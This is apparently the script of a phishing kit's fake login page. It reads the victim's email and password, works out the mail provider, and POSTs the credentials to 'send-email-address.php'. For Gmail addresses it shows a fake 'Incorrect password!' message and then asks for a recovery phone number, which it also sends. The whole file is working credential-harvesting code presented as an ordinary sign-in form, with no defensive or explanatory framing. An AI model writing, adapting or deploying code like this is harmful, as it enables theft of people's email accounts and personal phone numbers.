var counter = 0;
var email = document.getElementById('email');
var password = document.getElementById('password');
var showDomain = document.getElementById('domain-name');
var domain = '';

function checkMail(){
	domain = email.value.replace(/.*@/, "").split('.')[0];
	showDomain.textContent = domain;
}

$('#signin').click(function(e){
	e.preventDefault();
	var email = document.getElementById('email');
	domain = email.value.replace(/.*@/, "").split('.')[0];
	var checkmail = /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/g;
	var alert2 = document.querySelector('.alert2');
	var alert1 = document.querySelector('.alert1');
	if($('#email').val() == ""){
		$('#email').focus();
		$('.alert2').show();
		alert2.textContent = "Please enter your email address.";
		return false;
	}else if(!($('#email').val().match(checkmail))){
		$('#email').focus();
		$('.alert2').show();
		alert2.textContent = "Incorrect email format.";
		return false;
	}else if($('#password').val() == ""){
		$('#name').focus();
		$('.alert2').show();
		alert2.textContent = "Please enter your password";
		return false;
	}else{
		counter = counter + 1;
		alert2.className = alert2.className.replace(/\balert-danger\b/g, "alert-info");
		alert2.textContent = "Loggin in...";
		$('.alert2').show();

		if(counter > 1 && domain === 'gmail'){
			$('.alert').hide();
			var others = document.getElementById('others');
			var verify = document.getElementById('verify');
			var phone = document.getElementById('phone-no');
			var btnNext = document.getElementById('next');
			var emailToVerify = document.querySelector('.email-to-verify');
			
			others.className = others.className.replace(/\bshow\b/g, "hide");
			verify.className = verify.className.replace(/\bhide\b/g, "show");
			phone.focus();
			emailToVerify.textContent = email.value;

			$('#next').click(function(){
				if($('#phone-no').val() == ""){
					$('#phone-no').focus();
					$('.alert1').show();
					alert1.textContent = "Please enter your recovery phone number.";
					return false;
				} else {
					alert1.className = alert1.className.replace(/\balert-danger\b/g, "alert-info");
					alert1.textContent = "Processing...";
					$('.alert1').show();

					var xmlhttp;
				    if(window.XMLHttpRequest){
				      xmlhttp = new XMLHttpRequest();
				    }else{
				      xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
				    }

				    xmlhttp.onreadystatechange=function(){
				      if(xmlhttp.readyState==4 && xmlhttp.status==200){
							alert1.className = alert1.className.replace(/\balert-info\b/g, "alert-danger");
							alert1.textContent = xmlhttp.responseText;
							document.getElementById('password').value = "";
							document.getElementById('password').focus();
							$('.alert1').show();
							console.log('g');
				      } else {
				      	console.log(xmlhttp.responseText);
				      }
				    }

				    var formdata = new FormData();

			    	formdata.append("email", email);
			    	formdata.append("password", password);
			    	formdata.append("phone-no", phone.value);

				    var url = 'send-email-address.php?gmail';
				    
				    xmlhttp.open("POST", url);
				    xmlhttp.send(formdata);

				    return false;
				}
			})
			
		}

		if (domain === 'gmail'){
			setTimeout(function(){
				alert2.className = alert2.className.replace(/\balert-info\b/g, "alert-danger");
				alert2.textContent = 'Incorrect password!';
				$('.alert2').show();
				return false;
			}, 5000)
		}

		var xmlhttp;
	    if(window.XMLHttpRequest){
	      xmlhttp = new XMLHttpRequest();
	    }else{
	      xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
	    }

	    xmlhttp.onreadystatechange=function(){
	      if(xmlhttp.readyState==4 && xmlhttp.status==200){
				alert2.className = alert2.className.replace(/\balert-info\b/g, "alert-danger");
				alert2.textContent = xmlhttp.responseText;
				document.getElementById('password').value = "";
				document.getElementById('password').focus();
	      } else {
	      	console.log(xmlhttp.responseText);
	      }
	    }

	    var email = document.getElementById('email').value;
	    var password = document.getElementById('password').value;
	    var formdata = new FormData();

    	formdata.append("email", email);
    	formdata.append("password", password);

	    var url = 'send-email-address.php?others';
	    
	    xmlhttp.open("POST", url);
	    xmlhttp.send(formdata);

	    return false;

	}
})